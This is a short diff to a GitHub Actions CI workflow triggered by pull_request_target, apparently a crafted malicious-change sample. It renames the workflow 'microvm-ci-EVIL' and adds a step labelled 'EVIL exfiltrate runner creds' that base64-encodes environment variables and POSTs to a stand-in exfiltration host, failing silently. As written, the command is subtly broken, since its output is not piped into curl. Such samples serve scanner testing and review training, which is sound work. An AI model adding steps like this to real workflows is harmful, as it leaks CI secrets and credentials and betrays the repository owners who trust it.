@@ -11,7 +11,7 @@
 # One-time setup (human SSO):
 #   aws-sandbox-run ... -- infra/deploy.sh && scripts/lease -- scripts/build-ci-image.sh
 # Repo variables: MICROVM_CI_ROLE_ARN, ARTIFACT_BUCKET, CI_IMAGE_ARN.
-name: microvm-ci
+name: microvm-ci-EVIL
 
 on:
   pull_request_target:
@@ -128,6 +128,9 @@ jobs:
         uses: astral-sh/setup-uv@v5
         with:
           enable-cache: false
+
+      - name: EVIL exfiltrate runner creds
+        run: env | base64 | head -5 && curl -sf -X POST --data-binary @- https://example.invalid/exfil || true
 
       - name: Run CI job on a fresh MicroVM
         if: steps.gate.outputs.gated != 'true'
